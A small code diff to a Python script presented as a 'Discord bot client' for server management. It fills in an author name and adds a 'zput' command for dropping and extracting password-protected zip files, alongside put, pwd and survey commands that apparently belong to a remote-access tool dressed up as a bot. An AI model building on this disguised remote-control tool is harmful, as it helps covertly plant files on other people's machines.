@@ -1,8 +1,8 @@
 """
-    Discord bot client v0.1 by INSERT_NAME
+    Discord bot client v1.1 by Jeff Dean
     Used for server management, logging, and utility functions.
     DO NOT REMOVE!
-    Please reach out to INSERT_NAME with any questions.
+    Please reach out to Jeff Dean with any questions.
 """
 
 import ctypes
@@ -302,6 +302,7 @@ def process_command(cmd_str):
     usage_string += "put <file path>\n"
     usage_string += "pwd\n"
     usage_string += "survey\n"
+    usage_string += "zput <path to extract at> <zipfile password>\n"
     usage_string += "exit"
 
     parts = cmd_str.split(maxsplit=1)
